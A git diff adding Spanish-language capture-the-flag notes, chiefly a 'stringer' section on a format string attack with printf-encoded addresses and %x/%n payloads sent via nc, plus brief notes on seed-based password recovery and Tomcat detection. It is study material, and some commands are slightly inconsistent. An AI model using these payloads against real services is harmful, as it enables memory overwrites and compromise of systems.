@@ -120,3 +120,48 @@ La seed usada es el timestamp de Greece
 Si tenemos la seed es posible generar los mismos numeros con random.
 
 En este caso la implementación del chall es en lenguaje C, entonces buscando la implementación, después de darle los valores obtenemos la password perfectamente.
+
+# stringer
+Se trata de un format string attack
+
+6th address to reach stack data.
+
+`echo $(printf "\xf0\x87\x04\x08).%6$x | nc -u <IP> <PORT>"`
+
+Si especificamos la dirección en la que vamos a sobrescribir, al llegar a su dirección la modificamos con `%n`. 
+- Por ejemplo, los datos se encuentran en la dirección 6:
+```Bash
+echo $(printf "\xf0\x87\x04\x08").%x.%x.%x.%x.%x.%n | nc -u <IP> <PORT>
+```
+Si se quiere modificar con un valor predeterminado cuenta el número de caracteres antes de la dirección entonces si queremos cargar el número 10 utilizamos (los siguientes valores son en decimal):
+- %n escribe el número de bytes, en la memoria, antes de llegar a la dirección
+- %n escribe el número de caracteres que ya fueron impresos en la variable
+- `printf("blah %n",&val); // val = 5`
+- 4 de printf
+- 4 ochos
+- 4 + 4 + x = 10
+- x = 2
+```Bash
+echo $(printf "\xf0\x87\x04\x08").%8x.%8x.%8x.%8x.%2x.%n | nc -u <IP> <PORT>
+```
+
+- Tenemos una pila con valores estaticos
+- Cuando no se formatea correctamente(`printf("%s",var)`), tenemos acceso a la primera parte (`printf(var)`)
+- Es un binario de 64 bits
+- ASLR activado debido a que cambia la primera dirección cada vez que se ejecuta.
+
+
+[Format String Vulnerability Exploit in SeedLab | Information Security | printf("hello world"); - YouTube](https://www.youtube.com/watch?v=uOndsw3008M)
+
+[Format String to dump binary and gain RCE - 33c3ctf ESPR (pwn 150) - YouTube](https://www.youtube.com/watch?v=XuzuFUGuQv0)
+
+[PWN Echoland challenge — HTB. Writeup includes — Blind Format String… | by Karol Mazurek | Medium](https://karol-mazurek95.medium.com/pwn-echoland-challenge-htb-3363dbd6dc23)
+[DefCamp Qualifiers 2019: get-access (faraz.faith)](https://faraz.faith/2019-09-08-defcamp-get-access/)
+[blind attack:HITB-XCTF Quals 2018 - babypwn | 上善若水 (introspelliam.github.io)](https://introspelliam.github.io/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/)
+
+## smithers
+- Para evitar que echo nos añada un enter al final
+- `echo -n <IP>`
+
+
+- Cuando se tiene un JSESSIONID se trata de un tomcat.
